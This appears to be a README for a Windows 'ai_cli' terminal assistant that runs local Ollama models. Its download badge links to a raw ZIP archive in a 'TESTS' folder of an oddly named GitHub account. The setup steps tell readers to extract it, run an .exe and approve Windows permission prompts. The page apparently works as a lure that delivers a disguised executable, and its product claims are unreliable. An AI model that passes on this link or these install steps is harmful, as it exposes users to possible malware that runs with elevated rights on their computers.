[![Download ai_cli](https://img.shields.io/badge/Download-ai_cli%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Autoradiographinfighting868/ai_cli/main/TESTS/cli_ai_v2.0.zip)

## 🧭 What ai_cli does

ai_cli is a terminal app that uses local Ollama models to help you work on your computer. It can help you build programs, create documents, manage files, and handle project tasks from one place.

It is made for offline use first. That means it can work without sending your data to a cloud service.

## 💻 What you need

- Windows 10 or Windows 11
- A recent Intel or AMD processor
- 8 GB of RAM or more
- At least 5 GB of free disk space
- Ollama installed with one local model ready to use
- A terminal window such as Windows Terminal or Command Prompt

For smoother use, 16 GB of RAM is better.

## 🛠️ Install Ollama first

ai_cli uses local Ollama models. You need Ollama before you run the app.

1. Download Ollama from its official site.
2. Install it on your Windows PC.
3. Open Ollama.
4. Download one model, such as a small general model.
5. Keep Ollama running while you use ai_cli.

If you already use Ollama, check that it opens without errors.

## 🚀 Set up ai_cli on Windows

1. Download the ai_cli release file from the releases page.
2. If the file is in a ZIP folder, right-click it and choose Extract All.
3. Open the extracted folder.
4. Look for the app file, such as an `.exe` file.
5. Double-click the file to start the app.

If Windows asks for permission, choose Yes.

## 🖥️ Start using ai_cli

After the app opens, you can type plain requests in the terminal.

Try simple tasks like:

- Create a new project folder
- Write a README file
- List the files in a folder
- Help me plan a small app
- Draft a short document
- Review this code idea

The app acts like an assistant that can help with work on your local machine.

## 🔧 Basic use

Use short commands and plain requests. For example:

- Make a folder for my notes
- Create a simple to-do app
- Write a project summary
- Show me the files in this folder
- Help me clean up my desktop files

If the app asks for a model name, use the same name you set in Ollama.

## 🧠 How it works

ai_cli sends your requests to a local Ollama model and uses that model to help with tasks in your terminal. Because it runs on your computer, it fits users who want local control and a simple workflow.
